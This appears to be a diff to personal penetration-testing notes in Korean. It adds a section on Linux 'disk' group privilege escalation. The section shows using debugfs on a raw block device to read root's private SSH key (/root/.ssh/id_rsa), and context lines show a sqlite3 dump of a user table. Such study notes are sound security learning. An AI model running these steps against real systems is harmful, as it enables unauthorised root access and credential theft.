@@ -56,3 +56,17 @@ sqlite3 {dbname}
 select * from user;
 .quit
 ```
+---
+# disk group privilege escalation
+- https://www.hackingarticles.in/disk-group-privilege-escalation/
+- `disk` 그룹은 **로우 블록 디바이스**(예: `/dev/sda`, `/dev/nvme0n1p2`)에 접근할 수 있습니다.  
+```bash
+df -h  # 현재 마운트된 파일시스템의 디스크 사용량을 사람이 읽기 쉬운 형태로 출력합니다.
+```
+<img width="689" height="248" alt="image" src="https://github.com/user-attachments/assets/96e0cff6-b9f2-4624-9c36-417a71ddac0c" />
+
+```bash
+debugfs /dev/sda3  # 파일시스템의 내부 구조를 조작하거나 디버깅할 수 있는 저수준 파일시스템 디버거 실행
+mkdir test         # readonly로 설정되어 있으면 아래 코드 실행
+cat /root/.ssh/id_rsa
+```
